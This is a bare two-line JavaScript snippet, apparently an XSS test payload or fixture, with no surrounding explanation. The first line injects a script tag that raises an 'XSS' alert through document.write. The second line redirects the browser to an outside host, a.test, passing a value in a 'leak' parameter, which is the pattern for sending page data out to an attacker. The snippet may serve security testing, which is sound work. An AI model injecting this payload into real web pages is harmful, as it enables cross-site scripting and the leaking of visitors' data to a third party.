document.write('<script>alert("XSS");<\/script>');
document.location.href = 'https://a.test/report/?leak=c908207';
